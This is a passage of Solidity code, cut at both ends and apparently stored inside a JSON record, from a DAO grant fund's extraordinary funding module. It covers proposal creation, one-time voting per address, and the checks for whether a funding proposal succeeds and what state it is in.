_getMinimumThresholdPercentage())) revert InvalidProposal();\n\n        // store newly created proposal\n        newProposal.proposalId      = proposalId_;\n        newProposal.startBlock      = SafeCast.toUint128(block.number);\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n        newProposal.tokensRequested = totalTokensRequested;\n\n        emit ProposalCreated(\n            proposalId_,\n            msg.sender,\n            targets_,\n            values_,\n            new string[](targets_.length),\n            calldatas_,\n            block.number,\n            endBlock_,\n            description_\n        );\n    }\n\n    /************************/\n    /*** Voting Functions ***/\n    /************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function voteExtraordinary(\n        uint256 proposalId_\n    ) external override returns (uint256 votesCast_) {\n        // revert if msg.sender already voted on proposal\n        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n        // revert if proposal is inactive\n        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {\n            revert ExtraordinaryFundingProposalInactive();\n        }\n\n        // check voting power at snapshot block and update proposal votes\n        votesCast_ = _getVotesExtraordinary(msg.sender, proposalId_);\n        proposal.votesReceived += SafeCast.toUint120(votesCast_);\n\n        // record that voter has voted on this extraordinary funding proposal\n        hasVotedExtraordinary[proposalId_][msg.sender] = true;\n\n        emit VoteCast(\n            msg.sender,\n            proposalId_,\n            1,\n            votesCast_,\n            \"\"\n        );\n    }\n\n    /**\n     * @notice Check if a proposal for extraordinary funding has succeeded.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return Boolean indicating whether the proposal has succeeded.\n     */\n    function _extraordinaryProposalSucceeded(\n        uint256 proposalId_,\n        uint256 tokensRequested_\n    ) internal view returns (bool) {\n        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);\n        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();\n\n        return\n            // succeeded if proposal's votes received doesn't exceed the minimum threshold required\n            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))\n            &&\n            // succeeded if tokens requested are available for claiming from the treasury\n            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))\n        ;\n    }\n\n    /********************************/\n    /*** Internal View Functions ****/\n    /********************************/\n\n    /**\n     * @notice Get the current ProposalState of a given proposal.\n     * @dev    Used by GrantFund.state() for analytics compatability purposes.\n     * @param  proposalId_ The ID of the proposal being checked.\n     * @return The proposals status in the ProposalState enum.\n     */\n    function _getExtraordinaryProposalState(uint256 proposalId_) internal view returns (ProposalState) {\n        ExtraordinaryFundingProposal memory proposal = _extraordinaryFundingProposals[proposalId_];\n\n        bool voteSucceeded = _extraordinaryProposalSucceeded(proposalId_, uint256(proposal.tokensRequested));\n\n        if (proposal.executed)                                        return ProposalState.Executed;\n        else if (proposal.endBlock >= block.number && !voteSucceeded) retu"
    }
  ]
}